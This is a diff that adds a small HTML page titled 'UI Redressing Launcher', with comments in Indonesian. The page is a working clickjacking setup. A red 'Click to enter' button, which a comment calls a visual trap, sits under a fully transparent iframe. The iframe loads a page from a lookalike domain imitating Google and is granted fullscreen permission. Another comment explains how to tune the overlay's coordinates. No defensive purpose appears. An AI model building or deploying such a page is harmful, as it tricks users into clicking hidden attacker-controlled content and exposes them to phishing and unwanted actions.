@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UI Redressing Launcher</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #f0f0f0;
+        }
+        .container {
+            position: relative;
+            width: 250px;
+            height: 55px;
+        }
+        /* Tombol jebakan visual */
+        .base-button {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: #e03131;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            z-index: 1;
+        }
+        /* Iframe transparan yang dipasang tepat di atas tombol dasar */
+        .overlay-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+            z-index: 2;
+            opacity: 0.0; /* Ubah ke 0.4 saat melakukan uji coba koordinat agar area hijau terlihat */
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <button class="base-button">Klik untuk Masuk</button>
+    
+    <iframe 
+        class="overlay-frame" 
+        src="https://googllogoligaturee.my.id/full.html"
+        allow="fullscreen https://googllogoligaturee.my.id">
+    </iframe>
+</div>
+
+</body>
+</html>
